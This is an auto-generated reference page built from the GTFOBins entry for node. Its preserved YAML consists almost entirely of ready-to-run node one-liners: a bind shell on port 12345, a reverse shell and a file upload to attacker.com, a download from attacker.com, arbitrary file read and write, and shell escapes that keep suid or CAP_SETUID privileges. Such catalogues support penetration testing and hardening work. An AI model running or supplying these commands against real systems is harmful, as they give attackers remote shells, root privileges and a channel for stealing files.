---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# node

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `node` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/node` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [node](../../tools/linux/node.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | node |
| name | node |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/node/ |

## Preserved Source Material

```yaml
_body: ''
_name: node
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/node
functions:
  bind-shell:
  - code: "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n\
      \  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(12345)'"
    connector: tcp-client
    contexts:
      sudo: null
      suid:
        code: "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"]);\nrequire(\"net\").createServer(function\
          \ (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(12345)'"
      unprivileged: null
  download:
  - code: node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender: http-server
  file-read:
  - code: node -e 'process.stdout.write(require("fs").readFileSync("/path/to/input-file"))'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - code: node -e 'require("fs").writeFileSync("/path/to/output-file", "DATA")'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  reverse-shell:
  - code: "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").connect(12345, \"attacker.com\"\
      , function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n})'"
    contexts:
      sudo: null
      suid:
        code: "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"]);\nrequire(\"net\").connect(12345, \"\
          attacker.com\", function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n})'"
      unprivileged: null
    listener: tcp-server
  shell:
  - code: 'node -e ''require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'''
    contexts:
      capabilities:
        code: 'node -e ''process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'''
        list:
        - CAP_SETUID
      sudo: null
      suid:
        code: 'node -e ''require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'''
      unprivileged: null
  upload:
  - code: node -e 'require("fs").createReadStream("/path/to/input-file").pipe(require("http").request("http://attacker.com/path/to/output-file"))'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: http-server
```
